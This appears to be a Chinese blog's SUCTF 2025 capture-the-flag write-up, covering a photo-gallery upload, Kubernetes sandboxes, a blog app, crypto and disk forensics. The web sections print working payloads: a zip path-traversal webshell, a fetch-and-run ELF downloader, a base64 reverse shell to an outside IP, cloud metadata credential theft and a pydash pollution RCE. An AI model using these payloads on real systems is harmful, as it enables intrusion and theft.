@@ -1,0 +1,364 @@
+<!DOCTYPE html><html lang="en" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>25suctf | DDL'S BLOG</title><meta name="author" content="DDL"><meta name="copyright" content="DDL"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="Suctf2025–2标识为看的wp，没环境复现了 所有参考资料将在文本末尾标明 WEBSU_photogallery思路👇 构造一个压缩包，解压出我们想解压的部分，然后其他部分是损坏的，这样是不是就可以让整个解压过程是出错的从而进入到if里，我们的shell就这样留下了 先是php版本的漏洞 再根据源码漏洞上码 三种写码方法如下👇 法一12345678910111213&lt;?php$zi">
+<meta property="og:type" content="article">
+<meta property="og:title" content="25suctf">
+<meta property="og:url" content="http://example.com/2025/01/20/25suctf/index.html">
+<meta property="og:site_name" content="DDL&#39;S BLOG">
+<meta property="og:description" content="Suctf2025–2标识为看的wp，没环境复现了 所有参考资料将在文本末尾标明 WEBSU_photogallery思路👇 构造一个压缩包，解压出我们想解压的部分，然后其他部分是损坏的，这样是不是就可以让整个解压过程是出错的从而进入到if里，我们的shell就这样留下了 先是php版本的漏洞 再根据源码漏洞上码 三种写码方法如下👇 法一12345678910111213&lt;?php$zi">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="http://example.com/img/avatar.png">
+<meta property="article:published_time" content="2025-01-20T05:21:56.000Z">
+<meta property="article:modified_time" content="2025-01-20T05:22:21.698Z">
+<meta property="article:author" content="DDL">
+<meta property="article:tag" content="5wp">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://example.com/img/avatar.png"><link rel="shortcut icon" href="/img/avatar.png"><link rel="canonical" href="http://example.com/2025/01/20/25suctf/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css"><script>
+    (() => {
+      
+    const saveToLocal = {
+      set: (key, value, ttl) => {
+        if (!ttl) return
+        const expiry = Date.now() + ttl * 86400000
+        localStorage.setItem(key, JSON.stringify({ value, expiry }))
+      },
+      get: key => {
+        const itemStr = localStorage.getItem(key)
+        if (!itemStr) return undefined
+        const { value, expiry } = JSON.parse(itemStr)
+        if (Date.now() > expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return value
+      }
+    }
+
+    window.btf = {
+      saveToLocal,
+      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
+        script.onload = script.onreadystatechange = () => {
+          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
+        }
+        script.onerror = reject
+        document.head.appendChild(script)
+      }),
+      getCSS: (url, id) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onload = link.onreadystatechange = () => {
+          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
+        }
+        link.onerror = reject
+        document.head.appendChild(link)
+      }),
+      addGlobalFn: (key, fn, name = false, parent = window) => {
+        if (!false && key.startsWith('pjax')) return
+        const globalFn = parent.globalFn || {}
+        globalFn[key] = globalFn[key] || {}
+        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
+        parent.globalFn = globalFn
+      }
+    }
+  
+      
+      const activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      const activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+
+      btf.activateDarkMode = activateDarkMode
+      btf.activateLightMode = activateLightMode
+
+      const theme = saveToLocal.get('theme')
+    
+          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
+        
+      
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
+      }
+    
+      
+    const detectApple = () => {
+      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+  
+    })()
+  </script><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":false},
+  copy: {
+    success: 'Copy Successful',
+    error: 'Copy Failed',
+    noSupport: 'Browser Not Supported'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '',
+  dateSuffix: {
+    just: 'Just now',
+    min: 'minutes ago',
+    hour: 'hours ago',
+    day: 'days ago',
+    month: 'months ago'
+  },
+  copyright: undefined,
+  lightbox: 'null',
+  Snackbar: undefined,
+  infinitegrid: {
+    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid/dist/infinitegrid.min.js',
+    buttonText: 'Load More'
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '25suctf',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  isShuoshuo: false
+}</script><meta name="generator" content="Hexo 7.3.0"></head><body><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">17</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">5</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">1</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> blog</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> crchives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> link</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> message</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">DDL'S BLOG</span></a><a class="nav-page-title" href="/"><span class="site-name">25suctf</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><span class="site-page group"><i class="fa-fw fa fa-graduation-cap"></i><span> blog</span><i class="fas fa-chevron-down"></i></span><ul class="menus_item_child"><li><a class="site-page child" href="/categories/"><i class="fa-fw fa fa-archive"></i><span> categories</span></a></li><li><a class="site-page child" href="/tags/"><i class="fa-fw fa fa-tags"></i><span> tags</span></a></li><li><a class="site-page child" href="/archives/"><i class="fa-fw fa fa-folder-open"></i><span> crchives</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="/link/"><i class="fa-fw fa fa-link"></i><span> link</span></a></div><div class="menus_item"><a class="site-page" href="/comment/"><i class="fa-fw fa fa-paper-plane"></i><span> message</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> about</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">25suctf</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-01-20T05:21:56.000Z" title="Created 2025-01-20 13:21:56">2025-01-20</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-01-20T05:22:21.698Z" title="Updated 2025-01-20 13:22:21">2025-01-20</time></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-wordcount"><i class="far fa-file-word fa-fw post-meta-icon"></i><span class="post-meta-label">Word Count:</span><span class="word-count">1.9k</span><span class="post-meta-separator">|</span><i class="far fa-clock fa-fw post-meta-icon"></i><span class="post-meta-label">Reading Time:</span><span>8mins</span></span><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="Suctf2025"><a href="#Suctf2025" class="headerlink" title="Suctf2025"></a>Suctf2025</h1><p>–2标识为看的wp，没环境复现了</p>
+<p>所有参考资料将在文本末尾标明</p>
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="SU-photogallery"><a href="#SU-photogallery" class="headerlink" title="SU_photogallery"></a>SU_photogallery</h3><p>思路👇</p>
+<p>构造一个压缩包，解压出我们想解压的部分，然后其他部分是损坏的，这样是不是就可以让整个解压过程是出错的从而进入到if里，我们的shell就这样留下了</p>
+<p>先是php版本的漏洞</p>
+<p>再根据源码漏洞上码</p>
+<p>三种写码方法如下👇</p>
+<h4 id="法一"><a href="#法一" class="headerlink" title="法一"></a>法一</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$zip = new ZipArchive();</span><br><span class="line">$zipFilePath = &#x27;exp.zip&#x27;;</span><br><span class="line"></span><br><span class="line">if ($zip-&gt;open($zipFilePath, ZipArchive::CREATE | ZipArchive::OVERWRITE) === TRUE) &#123;</span><br><span class="line"></span><br><span class="line">    $zip-&gt;addFile(&#x27;1.php&#x27;, &quot;..\./..\./a.jpg&quot;);</span><br><span class="line"></span><br><span class="line">    $zip-&gt;close();</span><br><span class="line"></span><br><span class="line">    echo &quot;ok&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
+
+<p>配上</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">GET /upload/suimages/a.jpg?1=cat%20/seef1ag_getfl4g HTTP/1.1</span><br><span class="line">Host: 1.95.157.235:10002</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">GET /upload/suimages/a.php?1=cat%20/seef1ag_getfl4g HTTP/1.1</span><br></pre></td></tr></table></figure>
+
+<h4 id="法二"><a href="#法二" class="headerlink" title="法二"></a>法二</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import zipfile</span><br><span class="line">import io</span><br><span class="line"></span><br><span class="line">mf = io.BytesIO()</span><br><span class="line">with zipfile.ZipFile(mf, mode=&quot;w&quot;, compression=zipfile.ZIP_STORED) as zf:</span><br><span class="line">    zf.writestr(&#x27;fff.php&#x27;, b&#x27;&#x27;&#x27;@&lt;?php $a = &quot;sy&quot;.&quot;s&quot;.&quot;tem&quot;; $a(&quot;ls / &quot;);?&gt;&#x27;&#x27;&#x27;)</span><br><span class="line">    zf.writestr(&#x27;A&#x27;*5000, b&#x27;AAAAA&#x27;)</span><br><span class="line"></span><br><span class="line">with open(&quot;shell.zip&quot;, &quot;wb&quot;) as f:</span><br><span class="line">    f.write(mf.getvalue())</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<h4 id="法三"><a href="#法三" class="headerlink" title="法三"></a>法三</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">手动改压缩包，塞入第二个文件的第二个名字换成/////</span><br></pre></td></tr></table></figure>
+
+<p>部分原因复现可能失败，我用火狐浏览器复现失败，换的Google成功</p>
+<h3 id="easyk8s"><a href="#easyk8s" class="headerlink" title="easyk8s"></a>easyk8s</h3><p>读取文件</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 打开文件并读取内容</span><br><span class="line">with open(&#x27;/app/audit.py&#x27;, &#x27;r&#x27;) as file:</span><br><span class="line">    content = file.read()</span><br><span class="line">    print(content)</span><br></pre></td></tr></table></figure>
+
+<p>读取目录</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line"></span><br><span class="line"># 获取根目录（Unix/Linux/MacOS的根目录，Windows上会是C盘或其他驱动器）</span><br><span class="line">root_dir = &#x27;/&#x27;</span><br><span class="line"></span><br><span class="line"># 列出根目录下的文件和文件夹</span><br><span class="line">files_and_dirs = os.listdir(root_dir)</span><br><span class="line"></span><br><span class="line"># 打印所有文件和文件夹</span><br><span class="line">for item in files_and_dirs:</span><br><span class="line">    print(item)</span><br></pre></td></tr></table></figure>
+
+<p>查找与其他网络关系</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">那就探测内网信息，读取下系统内的配置文件信息看是否能发现有用的信息，包含：/etc/hosts、/proc/net/arp、proc/net/fib_trie等，最终在proc/net/fib_trie发现一个</span><br></pre></td></tr></table></figure>
+
+<p>码也写不进去，shell出不来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import requests</span><br><span class="line"></span><br><span class="line"># 远程文件URL</span><br><span class="line">url = &#x27;http://123.56.226.71/mshell.elf&#x27;</span><br><span class="line"># 目标保存的文件名</span><br><span class="line">file_name = &#x27;/tmp/mshell.elf&#x27;</span><br><span class="line"># 下载文件</span><br><span class="line">response = requests.get(url)</span><br><span class="line">with open(file_name, &#x27;wb&#x27;) as f:</span><br><span class="line">    f.write(response.content)</span><br><span class="line"></span><br><span class="line"># 赋予执行权限</span><br><span class="line">os.chmod(file_name, 0o755)</span><br><span class="line"></span><br><span class="line"># 执行下载的文件</span><br><span class="line">import ctypes</span><br><span class="line"></span><br><span class="line"># 调用 C 的 system 函数</span><br><span class="line">ctypes.CDLL(&quot;libc.so.6&quot;).system(&quot;sh /tmp/mshell.elf&quot;)</span><br><span class="line"></span><br><span class="line">os.system(f&#x27;./&#123;file_name&#125;&#x27;)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#x27;&#x27;.__class__.__mro__ [1].__subclasses__()[157].__init__.__globals__[&#x27;sys&#x27;].modules[&#x27;os&#x27;]</span><br><span class="line"></span><br><span class="line">&#x27;&#x27;.__class__.__mro__ [1].__subclasses__()[157].__init__.__globals__[&#x27;__builtins__&#x27;][&#x27;eval&#x27;]</span><br></pre></td></tr></table></figure>
+
+<h3 id="–2"><a href="#–2" class="headerlink" title="–2"></a>–2</h3><p>弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">import os</span><br><span class="line">import _posixsubprocess</span><br><span class="line"></span><br><span class="line">_posixsubprocess.fork_exec([b&quot;&quot;,&quot;-c&quot;,&quot;&#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNTYuMjM4LjIzMy4xMC8xMTQ1MiAwPiYx&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;], [b&quot;/bin/bash&quot;], True, (), None, None, -1, -1, -1, -1, -1, -1, *(os.pipe()), False, False,False, None, None, None, -1, None, False)</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">DEBUG=True  # open debug</span><br><span class="line">import os,sys</span><br><span class="line">op = print</span><br><span class="line">def print(*args):</span><br><span class="line">  t = sys._getframe(1).f_locals[&#x27;audit_functions&#x27;]</span><br><span class="line">  t[&quot;os.system&quot;][&#x27;ban&#x27;]= False</span><br><span class="line">  op(t)</span><br><span class="line">  return op(*args)</span><br><span class="line"></span><br><span class="line">os.system(&quot;ls&quot;) ## RCE </span><br></pre></td></tr></table></figure>
+
+<p>后边操作看不懂了，是nfs的</p>
+<h3 id="easyk8s-easy"><a href="#easyk8s-easy" class="headerlink" title="easyk8s-easy"></a>easyk8s-easy</h3><h3 id="–2-1"><a href="#–2-1" class="headerlink" title="–2"></a>–2</h3><p>访问元数据</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line"></span><br><span class="line">print(requests.get(&quot;http://100.100.100.200/latest/meta-data/ram/security-credentials/&quot;).text)</span><br><span class="line"></span><br><span class="line">print(requests.get(&quot;http://100.100.100.200/latest/meta-data/ram/security-credentials/oss-root&quot;).text)</span><br></pre></td></tr></table></figure>
+
+<p>访问oss，以下命令在攻击者机器上执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">aliyun configure --mode=StsToken</span><br><span class="line"># 配置 上面得到的 aksk</span><br><span class="line"></span><br><span class="line">aliyun oss ls</span><br><span class="line"># get oss://suctf-flag-bucket</span><br><span class="line"></span><br><span class="line">aliyun oss ls oss://suctf-flag-bucket --all-versions</span><br><span class="line"># 开了 bucket 版本控制 flag 被删除了  还原 可以得到 flag</span><br><span class="line"></span><br><span class="line">aliyun oss cat oss://suctf-flag-bucket/oss-flag --version-id CAEQmwIYgYDA6Lad1qIZIiAyMjBhNWVmMDRjYzY0MDI3YjhiODU3ZDQ2MDc1MjZhOA--</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="SU-blog"><a href="#SU-blog" class="headerlink" title="SU_blog"></a>SU_blog</h3><p>有文件包含，没使用权限，不是php，放弃</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250112101056361.png?raw=true" alt="image-20250112101056361"></p>
+<p>有cve，bootstrap的CVE-2024-6531，没找到poc</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250112101221204.png?raw=true" alt="image-20250112101221204"></p>
+<p>有提示</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">© 2025 My Blog. All rights reserved. 我最喜欢时间戳了，而且听说md5这种单项签名非常安全，所以我把博客诞生的时间当做了自己的SECRET</span><br></pre></td></tr></table></figure>
+
+<p>应该是身份伪造</p>
+<h3 id="–复现"><a href="#–复现" class="headerlink" title="–复现"></a>–复现</h3><p>先按照提示伪造身份</p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250114161017831.png?raw=true" alt="image-20250114161017831"></p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250114160922064.png?raw=true" alt="image-20250114160922064"></p>
+<p>显示文件包含读取源码+waf，</p>
+<p>读取waf用..&#x2F;间隔开用来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=articles/....//....//app/wa../f.py</span><br></pre></td></tr></table></figure>
+
+<p>然后pydash原型链污染</p>
+<p>污染点</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.py的set_(user_data, key, value)</span><br></pre></td></tr></table></figure>
+
+<p><a target="_blank" rel="noopener" href="https://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/">https://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/</a></p>
+<p>jinja2模板</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;name&quot;:&quot;__init__.__globals__.__loader__.__init__.__globals__.sys.modules.jinja2.runtime.exported.0&quot;,&quot;value&quot;:&quot;*;import os;os.system(&#x27;id&#x27;)&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>根据waf修改完之后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;key&quot;: &quot;.__init__.__globals__.t.NamedTuple.__globals__.sys.modules.jinja2.runtime.exported[2]&quot;,&quot;value&quot;: &quot;*;import os;os.system(&#x27;/read* &gt;/tmp/gaoren.txt&#x27;)&quot;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250114164822665.png?raw=true" alt="image-20250114164822665"></p>
+<p><img src="https://github.com/DDL08/images/blob/img/img/image-20250114164837794.png?raw=true" alt="image-20250114164837794"></p>
+<h3 id="jBOSS"><a href="#jBOSS" class="headerlink" title="jBOSS"></a>jBOSS</h3><p>CVE-2017-12149检测</p>
+<ul>
+<li>&#x2F;invoker&#x2F;readonly</li>
+</ul>
+<p>CVE-2017-7504检测</p>
+<ul>
+<li>&#x2F;jbossmq-httpil&#x2F;HTTPServerILServlet</li>
+</ul>
+<h2 id="密码"><a href="#密码" class="headerlink" title="密码"></a>密码</h2><h3 id="SU-signin"><a href="#SU-signin" class="headerlink" title="SU_signin"></a>SU_signin</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">p = 0x1a0111ea397fe69a4b1ba7b6434bacd764774b84f38512bf6730d2a0f6b0f6241eabfffeb153ffffb9feffffffffaaab</span><br><span class="line">K = GF(p)</span><br><span class="line">E = EllipticCurve(K, (0, 4))</span><br><span class="line">o = 793479390729215512516507951283169066088130679960393952059283337873017453583023682367384822284289</span><br><span class="line">n1, n2 = 859267, 52437899</span><br><span class="line"></span><br><span class="line">flag = &#x27;0&#x27;</span><br><span class="line">from tqdm import *</span><br><span class="line">exec(open(&#x27;data.txt&#x27;).read())</span><br><span class="line">for i in trange(1, len(cs)):</span><br><span class="line">    try:</span><br><span class="line">        roots = discrete_log((o//n1)*n2*E(cs[0]), (o//n1)*n2*E(cs[i]), operation=&#x27;+&#x27;)</span><br><span class="line">        flag += &#x27;0&#x27;</span><br><span class="line">    except:</span><br><span class="line">        flag += &#x27;1&#x27;</span><br><span class="line">        continue</span><br><span class="line"></span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">print(long_to_bytes(int(flag, 2)))</span><br></pre></td></tr></table></figure>
+
+<h2 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h2><h3 id="SU-forensics"><a href="#SU-forensics" class="headerlink" title="SU_forensics"></a>SU_forensics</h3><h4 id="Ubuntu14-04密码恢复"><a href="#Ubuntu14-04密码恢复" class="headerlink" title="Ubuntu14.04密码恢复"></a>Ubuntu14.04密码恢复</h4><ol>
+<li>进入界面长按shift</li>
+<li>高级选项</li>
+<li>revovery mode</li>
+<li>ro后边的改成quiet splash rw init&#x3D;&#x2F;bin&#x2F;bash<ol>
+<li>倒数第四行，会看到一行Linux &#x2F;boot&#x2F;vmlnuz-4.2.0-27-generic …….ro recovery nomodeset，</li>
+<li>quiet splash rw init&#x3D;&#x2F;bin&#x2F;bash</li>
+</ol>
+</li>
+<li>f10启动</li>
+<li>passwd修改密码<ol>
+<li>然后passwd bkfish修改bkfish密码</li>
+<li></li>
+</ol>
+</li>
+<li>最后visudo里加上去<ol>
+<li>bkfish ALL&#x3D;(ALL:ALL) ALL</li>
+</ol>
+</li>
+<li></li>
+</ol>
+<p>这里面有个加密压缩包文件👇</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/testtttsu/homework/blob/a4be9c81ae540340f3e208dc9b1ee109ea50305c/lost_flag.txt</span><br></pre></td></tr></table></figure>
+
+<p>参考</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/lcczzu/article/details/100148616</span><br></pre></td></tr></table></figure>
+
+<h4 id="进程查看"><a href="#进程查看" class="headerlink" title="进程查看"></a>进程查看</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">lsof | grep deleted</span><br><span class="line">#被删除却仍在使用</span><br></pre></td></tr></table></figure>
+
+<h4 id="恢复文件"><a href="#恢复文件" class="headerlink" title="恢复文件"></a>恢复文件</h4><p>.bash_history</p>
+<ul>
+<li>每当你在终端中执行一个命令时，<code>bash</code> 会将该命令记录到 <code>.bash_history</code> 文件中</li>
+<li>位于用户的 <strong>主目录</strong> 中，如 <code>/home/username/.bash_history</code></li>
+</ul>
+<p>用<a target="_blank" rel="noopener" href="https://www.diskgenius.com/">diskgenius</a></p>
+<p>内容</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">echo &quot;My secret has disappeared from this space and time, and you will never be able to find it.&quot;</span><br><span class="line">curl -s -o /dev/null https://www.cnblogs.com/cuisha12138/p/18631364</span><br><span class="line">sudo reboot</span><br></pre></td></tr></table></figure>
+
+<p>去搜索网站是一张图片，里面有加黑的key，需要调图片拿key</p>
+<ul>
+<li>2phxMo8iUE2bAVvdsBwZ</li>
+</ul>
+<p>根据图片的网站进去有个脚本+压缩包文件源码</p>
+<p>图片一堆奇怪文字，真成misc了，不做了</p>
+<h4 id="法一-1"><a href="#法一-1" class="headerlink" title="法一"></a>法一</h4><p><img src="https://github.com/DDL08/images/blob/img/img/image-20250119154741487.png?raw=true" alt="image-20250119154741487"></p>
+<h4 id="法二-1"><a href="#法二-1" class="headerlink" title="法二"></a>法二</h4><p>strings开搜<code>sudo reboot</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">strings xxx。vmdk |grep -n -A 20 -B 20 &quot;sudo reboot&quot;</span><br></pre></td></tr></table></figure>
+
+<p>找到bash_history</p>
